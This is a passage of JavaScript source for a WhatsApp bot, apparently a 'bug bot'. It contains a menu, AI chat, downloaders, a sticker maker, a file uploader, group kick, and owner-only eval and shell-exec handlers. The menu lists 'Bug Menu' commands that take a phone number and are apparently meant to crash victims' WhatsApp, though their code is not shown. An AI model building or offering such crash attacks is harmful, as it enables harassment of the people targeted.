┃⚜️ 𝐬𝐭𝐚𝐭𝐮𝐬 : ${AndraZyy.public ? 'Public Mode' : 'Self Mode'}
┃⚜️ 𝐨𝐰𝐧𝐞𝐫 : ${namaOwner}
┃⚜️ 𝐩𝐫𝐞𝐟𝐢𝐱 : ( ${prefix} )
┃⚜️ 𝐭𝐢𝐦𝐞 : ⏳ ${timee}
┃⚜️ 𝐓𝐚𝐤𝐚 𝐊𝐢𝐧𝐠⚡
┗════════════❐

*<Make sûre your are premium for this commandes>*
https://whatsapp.com/channel/0029Vark1I1AYlUR1G8YMX31

┏❐⌜ *𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮*⌟
┃ ➮ self
┃ ➮ public
┃ ➮ addprem
┃ ➮ delprem
┃ ➮ hidetag
┗════════════❐

┏❐⌜ *𝐁𝐮𝐠 𝐌𝐞𝐧𝐮*⌟
┃ ➮ taka-kill *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ➮ taka-v1 *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ➮ taka-v2 *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ➮ taka-v3 *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ➮ ui-system *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ➮ Xin-xbug *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┗════════════❐

┏❐⌜ *𝐀𝐈 𝐌𝐞𝐧𝐮*⌟
┃ ➮ ai <texte>
┗════════════❐

┏❐⌜ *𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮*⌟
┃ ➮ remini
┃ ➮ tt
┃ ➮ tourl
┃ ➮ splay
┃ ➮ kick
┗════════════❐
┏❐⌜ *𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮*⌟
┃ ➮ addvcf-all
┃ ➮ addvcf-except <jid>
┃ ➮ kickvcf-except <jid>
┃ ➮ kickvcf
┃ ➮ vcf
┃ ➮ tagall 
┃ ➮ all <message>
┗════════════❐

*⚜️⃟𒆜ꪻꪖᛕꪖ ᥇ꪊᧁ 5×⃟⚜️*

_🚹This script was created by samuel, and should not be misused by innocent people🚹_`;

  await AndraZyy.sendMessage(from, { image: thumb, caption: menuMessage }, { quoted: m });
}
break;

/**
  * Feature Ai With Logic & Sessions Made by MannR
  * Don't forget to follow
  * https://whatsapp.com/channel/0029VaGqCO6I1rcjc9hisJ3U
*/

case "ai": {
  if (!text) return m.reply("How can i help you ?");
  const aiSessions = shyzu.ai_sessions ?? {};
  const senderId = m.sender;

  if (!aiSessions[senderId]) {
    aiSessions[senderId] = { messages: [] };
  }

  const msgs = [
    ...aiSessions[senderId].messages,
    { content: text, role: "user" }
  ];

  const api_url = 'https://api.manaxu.my.id/api/ai';
  const api_key = 'key-manaxu-free';

  axios({
    method: 'POST',
    url: api_url,
    headers: {
      'x-api-key': api_key,
      'Content-Type': 'application/json'
    },
    data: {
      logic: 'Mon nom est TakaAi, un assistant IA intelligent créé par ᛕ꠸ꪀᧁꪻꪖᛕꪖ..',
      messages: msgs
    }
  })
  .then(response => {
    if (response.status === 200) {
      const { result } = response.data;
      m.reply(result ?? "Hmmm, il semble qu'il y ait une erreur avec l'API. Demandez de l'aide au propriétaire..");
      aiSessions[senderId].messages.push({ content: text, role: "user" });
      aiSessions[senderId].messages.push({ content: result, role: "assistant" });
      shyzu.ai_sessions = aiSessions;
    } else {
      m.reply("Hmmm, il semble qu'il y ait une erreur avec l'API. Demandez de l'aide au propriétaire..");
    }
  })
  .catch(error => {
    console.error(error);
    m.reply("Hmmm, on dirait que quelque chose s'est mal passé, demandez de l'aide au propriétaire.");
  });
}
break;

//===========TOOLS MENU=========//
case 'tiktok': case 'tt': {
  if (!text) return reply(`Example: ${prefix + command} link`);
  reply("Wait processing...")
 const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*
 *Video dari* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*Likes*: _${data.stats.likeCount ?? ''}_
*Comments*: _${data.stats.commentCount ?? ''}_
*Shares*: _${data.stats.shareCount ?? ''}_
*Plays*: _${data.stats.playCount ?? ''}_
*Saves*: _${data.stats.saveCount ?? ''}_
`;
 AndraZyy.sendMessage(m.chat, { caption: caption, video: { url: vidnya } }, { quoted: m })
}
break

case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return reply(example("First tag/reply foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return reply("Duration of vidéo maximum 15 sec!")
}
reply("Wait processing...")
var media = await AndraZyyt.downloadAndSaveMediaMessage(qmsg)
await AndraZyy.sendStimg(m.chat, media, m, {packname: `𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 ${namaBot} 👑`})
await fs.unlinkSync(media)
}
break

case 'splay': {
 const axios = require("axios");
 if (!text) return m.reply('Provide a Title ExamplenExample `Tiakola parapluie`');

 await reply("Loading To Enjoy your Music...");

 try {
 // URL API untuk pencarian lagu
 const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(text)}`;
 const searchData = (await axios.get(searchApiUrl)).data;
 
 // Pilih hasil pertama dari data pencarian
 const data = searchData[0];
 if (!data) return reply("Lagu tidak ditemukan.");

 // Teks yang akan dikirimkan
 const tekswait = `*𝐒𝐩𝐨𝐭𝐢𝐟𝐲 𝐩𝐥𝐚𝐲𝐞𝐫*

- *Judul:* ${data.title}
- *Artis:* ${data.artist}
- *URL:* ${data.url}`;

 // Mengirim pesan informasi lagu
 await AndraZyy.sendMessage(m.chat, { 
 text: `${tekswait}`, 
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: { 
 showAdAttribution: true,
 title:`${data.title}`,
 body:"SPOTIFY SEARCH & DOWNLOAD",
 thumbnailUrl: data.thumbnail,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 } 
 }, { quoted: m });

 // URL API untuk download lagu
 const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
 // Mendapatkan data dari API
 let response = await fetch(downloadApiUrl);
 
 // Memastikan respon adalah tipe audio
 if (response.headers.get("content-type") === "audio/mpeg") {
 // Mengirim audio melalui WhatsApp
 await AndraZyy.sendMessage(m.chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: m });
 } else {
 m.reply("Here is the file audio.");
 }
 } catch (error) {
 console.error(error);
 m.reply("Sorry error while fetching file audio.");
 }
}
break

case 'hd':
case 'hdr': 
case 'hdimg':
case 'remini':
case 'enhance': {
if (!/image/.test(mime)) return reply(`tag/reply to an image caption ${prefix+command}`)
reply("wait processing...")
let media = await quoted.download()
let proses = await remini(media, "enhance");
AndraZyy.sendMessage(m.chat, { image: proses, caption: 'IMAGE ENCHANTED ✅nBy ᛕ꠸ꪀᧁꪻꪖᛕꪖ'}, { quoted: m})
}
break
case 'tourl': {
const FormData = require("form-data");
const { fromBuffer } = require("file-type");
const fakeUserAgent = require("fake-useragent");
const { filesize } = require('filesize');
	let q = m.quoted ? m.quoted : m
	let mime = (q.msg || q).mimetype || ''
	const createFormData = (content, fieldName, ext) => {
 const { mime } = fromBuffer(content) || {};
 const formData = new FormData();
 formData.append(fieldName, content, `${new Date()}.${ext}`);
 return formData;
};

const catbox = async (content) => {
 try {
 /*
 @ CatBox Uploader
 $ Create by Syaii
 */
 const { ext, mime } = (await fromBuffer(content)) || {};
 const formData = createFormData(content, "fileToUpload", ext);
 formData.append("reqtype", "fileupload");
 const response = await fetch("https://catbox.moe/user/api.php", {
 method: "POST",
 body: formData,
 headers: {
 "User-Agent": fakeUserAgent(),
 },
 });
 return await response.text();
 } catch (error) {
 throw false;
 }
 }
	if (!mime) return reply('reply media!')
	reply("Wait processing...")
	let media = await q.download()
	let link = await catbox(media)
	let size = await fetch(link)
	size = await size.text()
	size = await filesize(size.length)
	let caption = `*SUCCES UPLOAD A FILE*

📊 *S I Z E :* ${size} Byte
🔗 *L I N K :* ${link} !
`
await AndraZyy.sendMessage(m.chat,{image: {url: link}, caption: caption }, { quoted: qtext2 })
}
break

case "kick": case "kik": {
if (!m.isGroup) return reply("Only Group")
if (!isCreator && !m.isAdmins) return reply("Only Owner!")
if (!m.isBotAdmins) return Reply("Bot is not Admin man")
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await AndraZyy.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Number is not registre on  whatsapp")
const res = await AndraZyy.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Menber ${input.split("@")[0]} kicked from group`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == AndraZyy) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));